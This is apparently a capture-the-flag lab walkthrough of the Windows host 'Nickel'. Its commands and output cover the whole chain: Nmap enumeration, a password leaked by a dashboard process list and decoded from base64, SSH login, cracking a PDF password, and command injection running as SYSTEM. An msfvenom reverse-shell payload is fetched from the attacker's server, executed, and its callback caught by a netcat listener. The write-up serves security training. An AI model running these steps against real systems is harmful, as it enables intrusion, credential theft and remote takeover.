# NMAP

A comprehensive Nmap scan of all TCP ports was performed with service version detection, default scripts, OS fingerprinting, and host discovery disabled. The target host at 192.168.184.99 was found to have multiple open ports across its entire range. The scan provided detailed service banners and script output for each discovered service, which is essential for identifying specific software versions and potential misconfigurations.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.184.99  --open 
```

The service version detection scan results reveal the target is a Windows host named NICKEL running Windows 10 or Server 2019 version 18362. Key findings include an FTP server with FileZilla version 0.9.60 beta, an OpenSSH service configured for Windows, and numerous indicators of a Windows domain environment including SMB, RPC, and NetBIOS. Several HTTP services are present on non-standard ports 8089 and 33333, and the host is accessible via Remote Desktop Protocol. The wide range of open ports, particularly high-numbered RPC ports, is consistent with a default Windows Server configuration.

```bash
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-12-20T18:46:53+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-12-06T11:11:21
|_Not valid after:  2026-06-07T11:11:21
|_ssl-date: 2025-12-20T18:47:58+00:00; -1s from scanner time.
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

A manual review of the web application running on TCP port 33333 identified an interface titled "DevOps Dashboard." The page presents three distinct functionality links: "List Current Deployments," "List Running Processes," and "List Active Nodes." This dashboard suggests the presence of a backend system management or orchestration panel, which could be leveraged to execute commands or gather sensitive system information if proper access controls are not enforced.





A test of the "List Current Deployments" functionality on the DevOps Dashboard returned an HTTP error stating "Cannot 'GET' /list-current-deployments". This indicates the endpoint likely expects a different HTTP method, such as POST, and is not directly accessible via a simple GET request. The error message is a standard default response, suggesting the underlying framework or application did not process the request as intended.

```bash
curl http://192.168.184.99:33333/list-current-deployments
<p>Cannot "GET" /list-current-deployments</p>                                                         
```

A follow-up test using an HTTP POST request with an empty body was sent to the same endpoint. The server responded with a "Not Implemented" message. This confirms the endpoint exists within the application's routing but the specific functionality for listing deployments is either disabled, incomplete, or requires specific parameters or headers not supplied in this request. The response is a 501 HTTP status code equivalent.

```bash
curl -X POST -H "Content-Length:0" http://192.168.184.99:33333/list-current-deployments
<p>Not Implemented</p>                                                                                
```

Exploitation of the "List Running Processes" endpoint was successful. The POST request returned a complete listing of the Windows system processes on the NICKEL host. Of critical importance, the output reveals clear-text command-line arguments for several key processes. A password for a user named "ariah" was discovered in a command associated with cmd.exe: the argument "-p" is followed by the value "Tm93aXNlU2xvb3BUaGVvcnkxMzkK", which appears to be a base64-encoded string. Furthermore, the listing exposes the presence and file paths of three custom PowerShell scripts running persistently on the system: ws80.ps1, ws8089.ps1, and ws33333.ps1. This endpoint functions as a significant information disclosure vulnerability.

```bash
curl -X POST -H "Content-Length:0" http://192.168.184.99:33333/list-running-procs      


name        : System Idle Process
commandline : 

name        : System
commandline : 

name        : Registry
commandline : 

name        : smss.exe
commandline : 

name        : csrss.exe
commandline : 

name        : wininit.exe
commandline : 

name        : csrss.exe
commandline : 

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline : 

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : dwm.exe
commandline : "dwm.exe"

name        : Memory Compression
commandline : 

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vm3dservice.exe
commandline : C:\Windows\system32\vm3dservice.exe

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : vm3dservice.exe
commandline : vm3dservice.exe -n

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa395f055 /state1:0x41c64e6d

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : MicrosoftEdgeUpdate.exe
commandline : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c

name        : SgrmBroker.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : CompatTelRunner.exe
commandline : C:\Windows\system32\compattelrunner.exe

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe

name        : CompatTelRunner.exe
commandline : C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun 
              -cv:yj6FL7BskEOO3GOH.1

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : taskhostw.exe
commandline : taskhostw.exe
```

The discovered base64-encoded string "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" was successfully decoded. The resulting cleartext password is "NowiseSloopTheory139". This credential is associated with the user "ariah" based on the command-line argument observed in the process listing. This constitutes a direct compromise of plaintext credentials.

```bash
echo  "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 -d  
NowiseSloopTheory139             
```

The obtained credentials for the user "ariah" were used to initiate an SSH connection to the target host at 192.168.184.99. The connection was successful, providing authenticated command-line access to the NICKEL Windows host via the OpenSSH for Windows service. This grants a standard user shell on the system.

```bash
ssh ariah@192.168.184.99 

```

The whoami command executed within the established SSH session confirms the current security context. The authenticated user is "ariah" within the "NICKEL" domain or workgroup. This verifies successful lateral movement and user-level access to the Windows host.

```bash
ariah@NICKEL C:\Users\ariah>whoami
nickel\ariah
```

A privilege assessment was performed. The user "ariah" possesses several enabled privileges, including SeShutdownPrivilege, SeChangeNotifyPrivilege, SeUndockPrivilege, SeIncreaseWorkingSetPrivilege, and SeTimeZonePrivilege. Notably, the user does not have high-value privileges such as SeDebugPrivilege or SeImpersonatePrivilege, indicating this is a standard user account without direct administrative authority on this specific host.

```bash
ariah@NICKEL C:\Users\ariah>whoami/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

Directory enumeration within the C:\ftp directory was conducted. A single file named "Infrastructure.pdf" was identified. The presence of this directory and file suggests the host may be configured as an internal FTP file repository. The PDF file is a potential source of sensitive information regarding the network infrastructure.

```bash
ariah@NICKEL C:\>cd ftp                   

ariah@NICKEL C:\ftp>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\ftp

09/01/2020  11:38 AM    <DIR>          .
09/01/2020  11:38 AM    <DIR>          ..
09/01/2020  10:02 AM            46,235 Infrastructure.pdf
               1 File(s)         46,235 bytes
               2 Dir(s)   7,656,714,240 bytes free

```

The file "Infrastructure.pdf" was successfully exfiltrated from the target host using the SCP protocol and the credentials for the user 'ariah'. The file was transferred to the attacker's local machine for offline analysis. The operation confirms the ability to read and extract files from the discovered FTP repository directory.

```bash
scp ariah@192.168.184.99:C:/ftp/Infrastructure.pdf .
ariah@192.168.184.99's password: 
Infrastructure.pdf  
```

The "Infrastructure.pdf" file was processed with the pdf2john utility to extract its password hash for cryptographic analysis. The resulting hash was written to a file named "pdf.hash" for subsequent offline cracking attempts. This step is performed to test for weak password protection on the document.

```bash
pdf2john Infrastructure.pdf > pdf.hash  
```

The password hash for the PDF file was successfully cracked using John the Ripper with the rockyou.txt wordlist and best64 rules. The password for the "Infrastructure.pdf" document is "ariah4168". The document is now accessible, potentially containing sensitive architectural or credential information.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 pdf.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ariah4168        (Infrastructure.pdf)     
1g 0:00:01:09 DONE (2025-12-20 19:31) 0.01448g/s 144885p/s 144885c/s 144885C/s ariah4168..ariad7
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed. 

```

The decrypted "Infrastructure.pdf" file was opened for analysis. The document contains architectural diagrams or textual details outlining the network infrastructure. The specific contents must be reviewed to identify key systems, software versions, IP address schemes, credentials, or other information that could expand the attack surface or facilitate further lateral movement.


```bash
evince Infrastructure.pdf 
```

Analysis of the decrypted Infrastructure.pdf revealed several internal URLs and system names. Key discoveries include a temporary command endpoint at [http://nickel/](http://nickel/), a backup system at [http://nickel-backup/backup](http://nickel-backup/backup), and a Network Attached Storage device at [http://corp-nas/files](http://corp-nas/files). These endpoints represent potential targets for further internal enumeration and exploitation within the network environment.
![[Pasted image 20251220193639.png]]

Network connection analysis was performed. The netstat output confirms all previously discovered listening services and their associated Process IDs. Of particular note is the discovery of a service listening on the local loopback address 127.0.0.1 on TCP port 80, which was not previously detected by external scans. Additionally, an established outbound SSH connection from the target to the attacking host is visible, confirming the active session. The Process ID of 4 for several services, including the loopback port 80, indicates they are running under the System process.

```bash
riah@NICKEL C:\>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1916
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2004
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       844
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1000
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:8089           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:33333          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       992
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1828
  TCP    127.0.0.1:80           0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       1916
  TCP    192.168.184.99:22      192.168.45.189:45056   ESTABLISHED     2004

```

The previously discovered internal endpoint was tested. A GET request to [http://localhost/](http://localhost/) with the parameter `?whoami` was executed. The web application, identified as "dev-api", responded and executed the command. The output "nt authority\system" is returned within the HTML response, indicating that the web service is running with SYSTEM-level privileges. This represents a critical remote command injection vulnerability.

```bash
ariah@NICKEL C:\>curl http://localhost/?whoami
<!doctype html><html><body>dev-api started at 2025-12-07T05:30:22

        <pre>nt authority\system
</pre>
</body></html>
```

A Windows reverse shell payload was generated using msfvenom. The payload is configured to connect back to the attacker's machine at IP address 192.168.45.189 on TCP port 443. The payload was saved in the Portable Executable format as "exploit.exe" for deployment on the target Windows host. This binary will provide a reverse command shell upon execution.

```bash
 msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe LHOST=192.168.45.189 LPORT=443 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: exploit.exe
                        

```

A simple HTTP server was initiated on port 8001 using Python. This server hosts the previously generated "exploit.exe" payload, making it available for download from the attacker's machine. This provides a mechanism to transfer the malicious executable to the compromised Windows host.

```bash
python3 -m http.server 8001    
```

A PowerShell command was executed on the target host to download the "exploit.exe" payload from the attacker's HTTP server. The Invoke-WebRequest cmdlet successfully transferred the file and saved it locally on the NICKEL host as 'exploit.exe'. The payload is now present on the target filesystem and ready for execution.

```bash
powershell -c "Invoke-WebRequest -Uri 'http://192.168.45.189:8001/exploit.exe' -OutFile 'exploit.exe'"
```

A command injection test was performed to verify the working directory of the vulnerable web service. The parameter `?pwd` was sent via a GET request to [http://localhost/](http://localhost/). The service executed a command to print the current working directory, returning "C:\Windows\system32". This confirms the web service is executing commands from the system directory with elevated privileges. The injection primitive is functional.

```bash
ariah@NICKEL C:\ftp>curl http://localhost/?pwd
<!doctype html><html><body>dev-api started at 2025-12-07T05:30:22

        <pre>
Path
----
C:\Windows\system32


```

An attempt was made to execute the downloaded payload via the command injection vulnerability. The command `C:\ftp\exploit.exe` was passed as a parameter in a GET request to the vulnerable endpoint. The `-UseBasicParsing` flag was included with the curl command to avoid parser errors on the Windows host. This step triggers the execution of the reverse shell binary with SYSTEM privileges.

```bash
curl "http://localhost/?C:\ftp\exploit.exe" -UseBaseParsing
```

A Netcat listener on port 443 received an incoming connection from the target host. A reverse shell session was established successfully. The session operates with high privileges, as evidenced by the ability to navigate to both the user "ariah" and "Administrator" desktop directories. The local user flag and the system proof.txt flag were captured from their respective locations, confirming full compromise of the host. The contents of the flags are 9fe6072e194c324fe40d13dd29a5f4c2 and 6e3ea1afc80162b4b9e932b7a09d5faf.

```bash
nc -lvp 443 
listening on [any] 443 ...
192.168.184.99: inverse host lookup failed: Unknown host
connect to [192.168.45.189] from (UNKNOWN) [192.168.184.99] 50125
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.


C:\Users\ariah\Desktop>type local.txt
type local.txt
9fe6072e194c324fe40d13dd29a5f4c2

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
6e3ea1afc80162b4b9e932b7a09d5faf



```